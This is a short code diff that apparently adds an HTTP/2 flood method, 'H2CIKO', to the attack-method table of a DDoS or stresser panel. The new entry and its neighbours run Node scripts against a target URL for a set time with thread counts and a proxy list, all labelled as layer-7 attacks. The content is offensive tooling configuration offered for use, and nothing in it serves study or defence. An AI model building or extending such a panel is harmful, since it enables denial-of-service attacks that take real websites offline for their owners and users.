@@ -19,6 +19,10 @@ let methods = {
             Command: 'cd /root/.xyran/ && node h2-flash.js {url} {time} 64 4 px.txt',
             Type: 'layer7'
         },
+        H2CIKO: {
+            Command: 'cd /root/.xyran/ && node h2-ciko.js {url} {time} 4 64 px.txt',
+            Type: 'layer7'
+        },
         H2FLOOD: {
             Command: 'cd /root/.xyran/ && node h2-flood.js {url} {time} 64 4 px.txt',
             Type: 'layer7'
